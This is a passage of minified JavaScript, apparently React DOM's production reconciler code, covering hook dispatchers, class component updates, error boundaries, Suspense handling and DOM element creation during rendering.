br={readContext:xe,useCallback:te,useContext:te,useEffect:te,useImperativeHandle:te,useInsertionEffect:te,useLayoutEffect:te,useMemo:te,useReducer:te,useRef:te,useState:te,useDebugValue:te,useDeferredValue:te,useTransition:te,useMutableSource:te,useSyncExternalStore:te,useId:te,unstable_isNewReconciler:!1},lf={readContext:xe,useCallback:function(e,t){return Ae().memoizedState=[e,t===void 0?null:t],e},useContext:xe,useEffect:Ts,useImperativeHandle:function(e,t,n){return n=n!=null?n.concat([e]):null,Pr(4194308,4,Su.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Pr(4194308,4,e,t)},useInsertionEffect:function(e,t){return Pr(4,2,e,t)},useMemo:function(e,t){var n=Ae();return t=t===void 0?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=Ae();return t=n!==void 0?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=rf.bind(null,U,e),[r.memoizedState,e]},useRef:function(e){var t=Ae();return e={current:e},t.memoizedState=e},useState:Cs,useDebugValue:Ci,useDeferredValue:function(e){return Ae().memoizedState=e},useTransition:function(){var e=Cs(!1),t=e[0];return e=nf.bind(null,e[1]),Ae().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=U,o=Ae();if(z){if(n===void 0)throw Error(v(407));n=n()}else{if(n=t(),Y===null)throw Error(v(349));jt&30||du(r,t,n)}o.memoizedState=n;var l={value:n,getSnapshot:t};return o.queue=l,Ts(pu.bind(null,r,l,e),[e]),r.flags|=2048,Qn(9,fu.bind(null,r,l,n,t),void 0,null),n},useId:function(){var e=Ae(),t=Y.identifierPrefix;if(z){var n=Be,r=Ve;n=(r&~(1<<32-Le(r)-1)).toString(32)+n,t=":"+t+"R"+n,n=$n++,0<n&&(t+="H"+n.toString(32)),t+=":"}else n=tf++,t=":"+t+"r"+n.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},sf={readContext:xe,useCallback:ku,useContext:xe,useEffect:ki,useImperativeHandle:wu,useInsertionEffect:vu,useLayoutEffect:yu,useMemo:Cu,useReducer:Vo,useRef:gu,useState:function(){return Vo(Kn)},useDebugValue:Ci,useDeferredValue:function(e){var t=Ee();return Tu(t,Q.memoizedState,e)},useTransition:function(){var e=Vo(Kn)[0],t=Ee().memoizedState;return[e,t]},useMutableSource:uu,useSyncExternalStore:cu,useId:xu,unstable_isNewReconciler:!1},af={readContext:xe,useCallback:ku,useContext:xe,useEffect:ki,useImperativeHandle:wu,useInsertionEffect:vu,useLayoutEffect:yu,useMemo:Cu,useReducer:Bo,useRef:gu,useState:function(){return Bo(Kn)},useDebugValue:Ci,useDeferredValue:function(e){var t=Ee();return Q===null?t.memoizedState=e:Tu(t,Q.memoizedState,e)},useTransition:function(){var e=Bo(Kn)[0],t=Ee().memoizedState;return[e,t]},useMutableSource:uu,useSyncExternalStore:cu,useId:xu,unstable_isNewReconciler:!1};function Re(e,t){if(e&&e.defaultProps){t=W({},t),e=e.defaultProps;for(var n in e)t[n]===void 0&&(t[n]=e[n]);return t}return t}function El(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:W({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var co={isMounted:function(e){return(e=e._reactInternals)?Ot(e)===e:!1},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=ie(),o=ut(e),l=Je(r,o);l.payload=t,n!=null&&(l.callback=n),t=st(e,l,o),t!==null&&(De(t,e,o,r),xr(t,e,o))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=ie(),o=ut(e),l=Je(r,o);l.tag=1,l.payload=t,n!=null&&(l.callback=n),t=st(e,l,o),t!==null&&(De(t,e,o,r),xr(t,e,o))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=ie(),r=ut(e),o=Je(n,r);o.tag=2,t!=null&&(o.callback=t),t=st(e,o,r),t!==null&&(De(t,e,r,n),xr(t,e,r))}};function xs(e,t,n,r,o,l,i){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,l,i):t.prototype&&t.prototype.isPureReactComponent?!Hn(n,r)||!Hn(o,l):!0}function Ru(e,t,n){var r=!1,o=ft,l=t.contextType;return typeof l=="object"&&l!==null?l=xe(l):(o=fe(t)?Et:oe.current,r=t.contextTypes,l=(r=r!=null)?qt(e,o):ft),t=new t(n,l),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=co,e.stateNode=t,t._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=o,e.__reactInternalMemoizedMaskedChildContext=l),t}function Es(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&co.enqueueReplaceState(t,t.state,null)}function Pl(e,t,n,r){var o=e.stateNode;o.props=n,o.state=e.memoizedState,o.refs={},mi(e);var l=t.contextType;typeof l=="object"&&l!==null?o.context=xe(l):(l=fe(t)?Et:oe.current,o.context=qt(e,l)),o.state=e.memoizedState,l=t.getDerivedStateFromProps,typeof l=="function"&&(El(e,t,l,n),o.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof o.getSnapshotBeforeUpdate=="function"||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(t=o.state,typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount(),t!==o.state&&co.enqueueReplaceState(o,o.state,null),Kr(e,n,o,r),o.state=e.memoizedState),typeof o.componentDidMount=="function"&&(e.flags|=4194308)}function rn(e,t){try{var n="",r=t;do n+=Ic(r),r=r.return;while(r);var o=n}catch(l){o=`
Error generating stack: `+l.message+`
`+l.stack}return{value:e,source:t,stack:o,digest:null}}function Jo(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function jl(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var uf=typeof WeakMap=="function"?WeakMap:Map;function Nu(e,t,n){n=Je(-1,n),n.tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){Yr||(Yr=!0,Fl=r),jl(e,t)},n}function Mu(e,t,n){n=Je(-1,n),n.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var o=t.value;n.payload=function(){return r(o)},n.callback=function(){jl(e,t)}}var l=e.stateNode;return l!==null&&typeof l.componentDidCatch=="function"&&(n.callback=function(){jl(e,t),typeof r!="function"&&(at===null?at=new Set([this]):at.add(this));var i=t.stack;this.componentDidCatch(t.value,{componentStack:i!==null?i:""})}),n}function Ps(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new uf;var o=new Set;r.set(t,o)}else o=r.get(t),o===void 0&&(o=new Set,r.set(t,o));o.has(n)||(o.add(n),e=Tf.bind(null,e,t,n),t.then(e,e))}function js(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function Rs(e,t,n,r,o){return e.mode&1?(e.flags|=65536,e.lanes=o,e):(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(t=Je(-1,1),t.tag=2,st(n,t,1))),n.lanes|=1),e)}var cf=be.ReactCurrentOwner,ce=!1;function le(e,t,n,r){t.child=e===null?lu(t,null,n,r):tn(t,e.child,n,r)}function Ns(e,t,n,r,o){n=n.render;var l=t.ref;return Xt(t,o),r=Si(e,t,n,r,l,o),n=wi(),e!==null&&!ce?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~o,Ge(e,t,o)):(z&&n&&si(t),t.flags|=1,le(e,t,r,o),t.child)}function Ms(e,t,n,r,o){if(e===null){var l=n.type;return typeof l=="function"&&!Mi(l)&&l.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(t.tag=15,t.type=l,Ou(e,t,l,r,o)):(e=Mr(n.type,null,r,t,t.mode,o),e.ref=t.ref,e.return=t,t.child=e)}if(l=e.child,!(e.lanes&o)){var i=l.memoizedProps;if(n=n.compare,n=n!==null?n:Hn,n(i,r)&&e.ref===t.ref)return Ge(e,t,o)}return t.flags|=1,e=ct(l,r),e.ref=t.ref,e.return=t,t.child=e}function Ou(e,t,n,r,o){if(e!==null){var l=e.memoizedProps;if(Hn(l,r)&&e.ref===t.ref)if(ce=!1,t.pendingProps=r=l,(e.lanes&o)!==0)e.flags&131072&&(ce=!0);else return t.lanes=e.lanes,Ge(e,t,o)}return Rl(e,t,n,r,o)}function Lu(e,t,n){var r=t.pendingProps,o=r.children,l=e!==null?e.memoizedState:null;if(r.mode==="hidden")if(!(t.mode&1))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},_($t,me),me|=n;else{if(!(n&1073741824))return e=l!==null?l.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,_($t,me),me|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=l!==null?l.baseLanes:n,_($t,me),me|=r}else l!==null?(r=l.baseLanes|n,t.memoizedState=null):r=n,_($t,me),me|=r;return le(e,t,o,n),t.child}function Du(e,t){var n=t.ref;(e===null&&n!==null||e!==null&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function Rl(e,t,n,r,o){var l=fe(n)?Et:oe.current;return l=qt(t,l),Xt(t,o),n=Si(e,t,n,r,l,o),r=wi(),e!==null&&!ce?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~o,Ge(e,t,o)):(z&&r&&si(t),t.flags|=1,le(e,t,n,o),t.child)}function Os(e,t,n,r,o){if(fe(n)){var l=!0;Wr(t)}else l=!1;if(Xt(t,o),t.stateNode===null)jr(e,t),Ru(t,n,r),Pl(t,n,r,o),r=!0;else if(e===null){var i=t.stateNode,s=t.memoizedProps;i.props=s;var a=i.context,c=n.contextType;typeof c=="object"&&c!==null?c=xe(c):(c=fe(n)?Et:oe.current,c=qt(t,c));var p=n.getDerivedStateFromProps,h=typeof p=="function"||typeof i.getSnapshotBeforeUpdate=="function";h||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s!==r||a!==c)&&Es(t,i,r,c),Ze=!1;var m=t.memoizedState;i.state=m,Kr(t,r,i,o),a=t.memoizedState,s!==r||m!==a||de.current||Ze?(typeof p=="function"&&(El(t,n,p,r),a=t.memoizedState),(s=Ze||xs(t,n,s,r,m,a,c))?(h||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount()),typeof i.componentDidMount=="function"&&(t.flags|=4194308)):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=a),i.props=r,i.state=a,i.context=c,r=s):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),r=!1)}else{i=t.stateNode,su(e,t),s=t.memoizedProps,c=t.type===t.elementType?s:Re(t.type,s),i.props=c,h=t.pendingProps,m=i.context,a=n.contextType,typeof a=="object"&&a!==null?a=xe(a):(a=fe(n)?Et:oe.current,a=qt(t,a));var S=n.getDerivedStateFromProps;(p=typeof S=="function"||typeof i.getSnapshotBeforeUpdate=="function")||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s!==h||m!==a)&&Es(t,i,r,a),Ze=!1,m=t.memoizedState,i.state=m,Kr(t,r,i,o);var w=t.memoizedState;s!==h||m!==w||de.current||Ze?(typeof S=="function"&&(El(t,n,S,r),w=t.memoizedState),(c=Ze||xs(t,n,c,r,m,w,a)||!1)?(p||typeof i.UNSAFE_componentWillUpdate!="function"&&typeof i.componentWillUpdate!="function"||(typeof i.componentWillUpdate=="function"&&i.componentWillUpdate(r,w,a),typeof i.UNSAFE_componentWillUpdate=="function"&&i.UNSAFE_componentWillUpdate(r,w,a)),typeof i.componentDidUpdate=="function"&&(t.flags|=4),typeof i.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof i.componentDidUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=w),i.props=r,i.state=w,i.context=a,r=c):(typeof i.componentDidUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&m===e.memoizedState||(t.flags|=1024),r=!1)}return Nl(e,t,n,r,l,o)}function Nl(e,t,n,r,o,l){Du(e,t);var i=(t.flags&128)!==0;if(!r&&!i)return o&&gs(t,n,!1),Ge(e,t,l);r=t.stateNode,cf.current=t;var s=i&&typeof n.getDerivedStateFromError!="function"?null:r.render();return t.flags|=1,e!==null&&i?(t.child=tn(t,e.child,null,l),t.child=tn(t,null,s,l)):le(e,t,s,l),t.memoizedState=r.state,o&&gs(t,n,!0),t.child}function _u(e){var t=e.stateNode;t.pendingContext?hs(e,t.pendingContext,t.pendingContext!==t.context):t.context&&hs(e,t.context,!1),hi(e,t.containerInfo)}function Ls(e,t,n,r,o){return en(),ui(o),t.flags|=256,le(e,t,n,r),t.child}var Ml={dehydrated:null,treeContext:null,retryLane:0};function Ol(e){return{baseLanes:e,cachePool:null,transitions:null}}function Iu(e,t,n){var r=t.pendingProps,o=H.current,l=!1,i=(t.flags&128)!==0,s;if((s=i)||(s=e!==null&&e.memoizedState===null?!1:(o&2)!==0),s?(l=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(o|=1),_(H,o&1),e===null)return Tl(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(t.mode&1?e.data==="$!"?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(i=r.children,e=r.fallback,l?(r=t.mode,l=t.child,i={mode:"hidden",children:i},!(r&1)&&l!==null?(l.childLanes=0,l.pendingProps=i):l=mo(i,r,0,null),e=xt(e,r,n,null),l.return=t,e.return=t,l.sibling=e,t.child=l,t.child.memoizedState=Ol(n),t.memoizedState=Ml,e):Ti(t,i));if(o=e.memoizedState,o!==null&&(s=o.dehydrated,s!==null))return df(e,t,i,r,s,o,n);if(l){l=r.fallback,i=t.mode,o=e.child,s=o.sibling;var a={mode:"hidden",children:r.children};return!(i&1)&&t.child!==o?(r=t.child,r.childLanes=0,r.pendingProps=a,t.deletions=null):(r=ct(o,a),r.subtreeFlags=o.subtreeFlags&14680064),s!==null?l=ct(s,l):(l=xt(l,i,n,null),l.flags|=2),l.return=t,r.return=t,r.sibling=l,t.child=r,r=l,l=t.child,i=e.child.memoizedState,i=i===null?Ol(n):{baseLanes:i.baseLanes|n,cachePool:null,transitions:i.transitions},l.memoizedState=i,l.childLanes=e.childLanes&~n,t.memoizedState=Ml,r}return l=e.child,e=l.sibling,r=ct(l,{mode:"visible",children:r.children}),!(t.mode&1)&&(r.lanes=n),r.return=t,r.sibling=null,e!==null&&(n=t.deletions,n===null?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=r,t.memoizedState=null,r}function Ti(e,t){return t=mo({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function hr(e,t,n,r){return r!==null&&ui(r),tn(t,e.child,null,n),e=Ti(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function df(e,t,n,r,o,l,i){if(n)return t.flags&256?(t.flags&=-257,r=Jo(Error(v(422))),hr(e,t,i,r)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(l=r.fallback,o=t.mode,r=mo({mode:"visible",children:r.children},o,0,null),l=xt(l,o,i,null),l.flags|=2,r.return=t,l.return=t,r.sibling=l,t.child=r,t.mode&1&&tn(t,e.child,null,i),t.child.memoizedState=Ol(i),t.memoizedState=Ml,l);if(!(t.mode&1))return hr(e,t,i,null);if(o.data==="$!"){if(r=o.nextSibling&&o.nextSibling.dataset,r)var s=r.dgst;return r=s,l=Error(v(419)),r=Jo(l,r,void 0),hr(e,t,i,r)}if(s=(i&e.childLanes)!==0,ce||s){if(r=Y,r!==null){switch(i&-i){case 4:o=2;break;case 16:o=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:o=32;break;case 536870912:o=268435456;break;default:o=0}o=o&(r.suspendedLanes|i)?0:o,o!==0&&o!==l.retryLane&&(l.retryLane=o,Qe(e,o),De(r,e,o,-1))}return Ni(),r=Jo(Error(v(421))),hr(e,t,i,r)}return o.data==="$?"?(t.flags|=128,t.child=e.child,t=xf.bind(null,e),o._reactRetry=t,null):(e=l.treeContext,he=it(o.nextSibling),ge=t,z=!0,Me=null,e!==null&&(we[ke++]=Ve,we[ke++]=Be,we[ke++]=Pt,Ve=e.id,Be=e.overflow,Pt=t),t=Ti(t,r.children),t.flags|=4096,t)}function Ds(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),xl(e.return,t,n)}function $o(e,t,n,r,o){var l=e.memoizedState;l===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:o}:(l.isBackwards=t,l.rendering=null,l.renderingStartTime=0,l.last=r,l.tail=n,l.tailMode=o)}function Au(e,t,n){var r=t.pendingProps,o=r.revealOrder,l=r.tail;if(le(e,t,r.children,n),r=H.current,r&2)r=r&1|2,t.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Ds(e,n,t);else if(e.tag===19)Ds(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(_(H,r),!(t.mode&1))t.memoizedState=null;else switch(o){case"forwards":for(n=t.child,o=null;n!==null;)e=n.alternate,e!==null&&Qr(e)===null&&(o=n),n=n.sibling;n=o,n===null?(o=t.child,t.child=null):(o=n.sibling,n.sibling=null),$o(t,!1,o,n,l);break;case"backwards":for(n=null,o=t.child,t.child=null;o!==null;){if(e=o.alternate,e!==null&&Qr(e)===null){t.child=o;break}e=o.sibling,o.sibling=n,n=o,o=e}$o(t,!0,n,null,l);break;case"together":$o(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function jr(e,t){!(t.mode&1)&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Ge(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),Rt|=t.lanes,!(n&t.childLanes))return null;if(e!==null&&t.child!==e.child)throw Error(v(153));if(t.child!==null){for(e=t.child,n=ct(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=ct(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function ff(e,t,n){switch(t.tag){case 3:_u(t),en();break;case 5:au(t);break;case 1:fe(t.type)&&Wr(t);break;case 4:hi(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,o=t.memoizedProps.value;_(Jr,r._currentValue),r._currentValue=o;break;case 13:if(r=t.memoizedState,r!==null)return r.dehydrated!==null?(_(H,H.current&1),t.flags|=128,null):n&t.child.childLanes?Iu(e,t,n):(_(H,H.current&1),e=Ge(e,t,n),e!==null?e.sibling:null);_(H,H.current&1);break;case 19:if(r=(n&t.childLanes)!==0,e.flags&128){if(r)return Au(e,t,n);t.flags|=128}if(o=t.memoizedState,o!==null&&(o.rendering=null,o.tail=null,o.lastEffect=null),_(H,H.current),r)break;return null;case 22:case 23:return t.lanes=0,Lu(e,t,n)}return Ge(e,t,n)}var Fu,Ll,zu,Hu;Fu=function(e,t){for(var n=t.child;n!==null;){if(n.tag===5||n.tag===6)e.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};Ll=function(){};zu=function(e,t,n,r){var o=e.memoizedProps;if(o!==r){e=t.stateNode,Ct(He.current);var l=null;switch(n){case"input":o=el(e,o),r=el(e,r),l=[];break;case"select":o=W({},o,{value:void 0}),r=W({},r,{value:void 0}),l=[];break;case"textarea":o=rl(e,o),r=rl(e,r),l=[];break;default:typeof o.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=Hr)}ll(n,r);var i;n=null;for(c in o)if(!r.hasOwnProperty(c)&&o.hasOwnProperty(c)&&o[c]!=null)if(c==="style"){var s=o[c];for(i in s)s.hasOwnProperty(i)&&(n||(n={}),n[i]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Ln.hasOwnProperty(c)?l||(l=[]):(l=l||[]).push(c,null));for(c in r){var a=r[c];if(s=o!=null?o[c]:void 0,r.hasOwnProperty(c)&&a!==s&&(a!=null||s!=null))if(c==="style")if(s){for(i in s)!s.hasOwnProperty(i)||a&&a.hasOwnProperty(i)||(n||(n={}),n[i]="");for(i in a)a.hasOwnProperty(i)&&s[i]!==a[i]&&(n||(n={}),n[i]=a[i])}else n||(l||(l=[]),l.push(c,n)),n=a;else c==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,s=s?s.__html:void 0,a!=null&&s!==a&&(l=l||[]).push(c,a)):c==="children"?typeof a!="string"&&typeof a!="number"||(l=l||[]).push(c,""+a):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Ln.hasOwnProperty(c)?(a!=null&&c==="onScroll"&&I("scroll",e),l||s===a||(l=[])):(l=l||[]).push(c,a))}n&&(l=l||[]).push("style",n);var c=l;(t.updateQueue=c)&&(t.flags|=4)}};Hu=function(e,t,n,r){n!==r&&(t.flags|=4)};function vn(e,t){if(!z)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;t!==null;)t.alternate!==null&&(n=t),t=t.sibling;n===null?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function ne(e){var t=e.alternate!==null&&e.alternate.child===e.child,n=0,r=0;if(t)for(var o=e.child;o!==null;)n|=o.lanes|o.childLanes,r|=o.subtreeFlags&14680064,r|=o.flags&14680064,o.return=e,o=o.sibling;else for(o=e.child;o!==null;)n|=o.lanes|o.childLanes,r|=o.subtreeFlags,r|=o.flags,o.return=e,o=o.sibling;return e.subtreeFlags|=r,e.childLanes=n,t}function pf(e,t,n){var r=t.pendingProps;switch(ai(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ne(t),null;case 1:return fe(t.type)&&Ur(),ne(t),null;case 3:return r=t.stateNode,nn(),A(de),A(oe),vi(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(pr(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&!(t.flags&256)||(t.flags|=1024,Me!==null&&(Ul(Me),Me=null))),Ll(e,t),ne(t),null;case 5:gi(t);var o=Ct(Jn.current);if(n=t.type,e!==null&&t.stateNode!=null)zu(e,t,n,r,o),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!r){if(t.stateNode===null)throw Error(v(166));return ne(t),null}if(e=Ct(He.current),pr(t)){r=t.stateNode,n=t.type;var l=t.memoizedProps;switch(r[Fe]=t,r[Vn]=l,e=(t.mode&1)!==0,n){case"dialog":I("cancel",r),I("close",r);break;case"iframe":case"object":case"embed":I("load",r);break;case"video":case"audio":for(o=0;o<Cn.length;o++)I(Cn[o],r);break;case"source":I("error",r);break;case"img":case"image":case"link":I("error",r),I("load",r);break;case"details":I("toggle",r);break;case"input":Vi(r,l),I("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!l.multiple},I("invalid",r);break;case"textarea":Ji(r,l),I("invalid",r)}ll(n,l),o=null;for(var i in l)if(l.hasOwnProperty(i)){var s=l[i];i==="children"?typeof s=="string"?r.textContent!==s&&(l.suppressHydrationWarning!==!0&&fr(r.textContent,s,e),o=["children",s]):typeof s=="number"&&r.textContent!==""+s&&(l.suppressHydrationWarning!==!0&&fr(r.textContent,s,e),o=["children",""+s]):Ln.hasOwnProperty(i)&&s!=null&&i==="onScroll"&&I("scroll",r)}switch(n){case"input":or(r),Bi(r,l,!0);break;case"textarea":or(r),$i(r);break;case"select":case"option":break;default:typeof l.onClick=="function"&&(r.onclick=Hr)}r=o,t.updateQueue=r,r!==null&&(t.flags|=4)}else{i=o.nodeType===9?o:o.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=pa(n)),e==="http://www.w3.org/1999/xhtml"?n==="script"?(e=i.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=i.createElement(n,{is:r.is}):(e=i.createElement(n),n==="select"&&(i=e,r.multiple?i.multiple=!0:r.size&&(i.size=r.size))):e=i.createElementNS(e,n),e[Fe]=t,e[Vn]=r,Fu(e,t,!1,!1),t.stateNode=e;e:{switch(i=il(n,r),n){case"dialog":I("cancel",e),I("close",e),o=r;break;case"iframe":case"object":case"embed":I("load",e),o=r;break;case"video":case"audio":for(o=0;o<Cn.length;o++)I(Cn[o],e);o=r;break;case"source":I("error",e),o=r;break;case"img":case"image":case"link":I("error",e),I("load",e),o=r;break;case"details":I("toggle",e),o=r;break;case"input":Vi(e,r),o=el(e,r),I("invalid",e);break;case"option":o=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},o=W({},r,{value:void 0}),I("invalid",e);break;case"textarea":Ji(e,r),o=rl(e,r),I("invalid",e);break;default:o=r}ll(n,o),s=o;for(l in s)if(s.hasOwnProperty(l)){var a=s[l];l==="style"?ga(e,a):l==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,a!=null&&ma(e,a)):l==="children"?typeof a=="string"?(n!=="textarea"||a!=="")&&Dn(e,a):typeof a=="number"&&Dn(e,""+a):l!=="suppressContentEditableWarning"&&l!=="suppressHydrationWarning"&&l!=="autoFocus"&&(Ln.hasOwnProperty(l)?a!=null&&l==="onScroll"&&I("scroll",e):a!=null&&Ql(e,l,a,i))}switch(n){case"input":or(e),Bi(e,r,!1);break;case"textarea":or(e),$i(e);break;case"option":r.value!=null&&e.setAttribute("value",""+dt(r.value));break;case"select":e.multiple=!!r.multiple,l=r.value,l!=null?Kt(e,!!r.multiple,l,!1):r.defaultValue!=null&&Kt(e,!!r.multiple,r.defaultValue,!0);break;default:typeof o.onClick=="function"&&(e.onclick=Hr)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return ne(t),null;case 6:if(e&&t.stateNode!=null)Hu(e,t,e.memoizedProps,r);else{if(typeof r!="string"&&t.stateNode===null)throw Error(v(166));if(n=Ct(Jn.current),Ct(He.current),pr(t)){if(r=t.stateNode,n=t.memoizedProps,r[Fe]=t,(l=r.nodeValue!==n)&&(e=ge,e!==null))switch(e.tag){case 3:fr(r.nodeValue,n,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&fr(r.nodeValue,n,(e.mode&1)!==0)}l&&(t.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[Fe]=t,t.stateNode=r}return ne(t),null;case 13:if(A(H),r=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(z&&he!==null&&t.mode&1&&!(t.flags&128))ru(),en(),t.flags|=98560,l=!1;else if(l=pr(t),r!==null&&r.dehydrated!==null){if(e===null){if(!l)throw Error(v(318));if(l=t.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(v(317));l[Fe]=t}else en(),!(t.flags&128)&&(t.memoizedState=null),t.flags|=4;ne(t),l=!1}else Me!==null&&(Ul(Me),Me=null),l=!0;if(!l)return t.flags&65536?t:null}return t.flags&128?(t.lanes=n,t):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(t.child.flags|=8192,t.mode&1&&(e===null||H.current&1?G===0&&(G=3):Ni())),t.updateQueue!==null&&(t.flags|=4),ne(t),null);case 4:return nn(),Ll(e,t),e===null&&Un(t.stateNode.containerInfo),ne(t),null;case 10:return fi(t.type._context),ne(t),null;case 17:return fe(t.type)&&Ur(),ne(t),null;case 19:if(A(H),l=t.memoizedState,l===null)return 